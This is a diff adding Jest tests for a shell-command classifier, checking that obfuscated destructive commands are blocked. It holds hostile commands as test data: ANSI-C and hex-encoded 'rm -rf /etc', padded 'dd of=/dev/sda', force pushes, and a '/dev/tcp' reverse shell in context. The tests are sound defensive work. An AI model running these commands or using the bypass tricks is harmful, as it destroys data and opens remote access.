@@ -634,6 +634,65 @@ describe("classifyCommand", () => {
     });
   });
 
+  describe("dollar-quoted ANSI-C bypass (round 3)", () => {
+    test("$'r'$'m' -rf /etc (concatenated ANSI-C segments)", () => {
+      expect(classifyCommand("$'r'$'m' -rf /etc").ok).toBe(false);
+    });
+
+    test("rm -$'r'f /etc (ANSI-C flag fragment)", () => {
+      expect(classifyCommand("rm -$'r'f /etc").ok).toBe(false);
+    });
+
+    test("chmod -$'R' 777 /etc (ANSI-C flag fragment)", () => {
+      expect(classifyCommand("chmod -$'R' 777 /etc").ok).toBe(false);
+    });
+
+    test("git reset --$'hard' HEAD (ANSI-C flag)", () => {
+      expect(classifyCommand("git reset --$'hard' HEAD").ok).toBe(false);
+    });
+
+    test("hex-encoded rm: $'\\x72\\x6d' -rf /etc", () => {
+      expect(classifyCommand("$'\\x72\\x6d' -rf /etc").ok).toBe(false);
+    });
+  });
+
+  describe("padded destructive commands (round 3 bounded-span bypass)", () => {
+    test("dd of=/dev/sda with long padding between dd and of=", () => {
+      const padded = `dd ${"x".repeat(600)} of=/dev/sda`;
+      expect(classifyCommand(padded).ok).toBe(false);
+    });
+
+    test("find ... -delete with long padding", () => {
+      const padded = `find /var ${"-name foo ".repeat(60)} -delete`;
+      expect(classifyCommand(padded).ok).toBe(false);
+    });
+
+    test("xargs ... rm with long padding", () => {
+      const padded = `echo files | xargs ${"--arg ".repeat(100)}rm`;
+      expect(classifyCommand(padded).ok).toBe(false);
+    });
+  });
+
+  describe("git multi-refspec + quoted-message (round 3)", () => {
+    test("git push origin main +HEAD:main (force refspec in 2nd slot)", () => {
+      expect(classifyCommand("git push origin main +HEAD:main").ok).toBe(false);
+    });
+
+    test("git push --tags origin +HEAD:main (force refspec after options)", () => {
+      expect(classifyCommand("git push --tags origin +HEAD:main").ok).toBe(false);
+    });
+
+    test('git commit -m "document git push --force policy" (quoted msg FP guard)', () => {
+      // Prior regex false-positived on any mention of --force/push in a
+      // commit message body. Now subcommand is "commit", not "push".
+      expect(classifyCommand('git commit -m "document git push --force policy"').ok).toBe(true);
+    });
+
+    test('git log --grep="push --force" (search pattern FP guard)', () => {
+      expect(classifyCommand('git log --grep="push --force"').ok).toBe(true);
+    });
+  });
+
   describe("ClassificationResult shape", () => {
     test("blocked result has all required fields", () => {
       const result = classifyCommand("bash -i >& /dev/tcp/x/4444 0>&1");
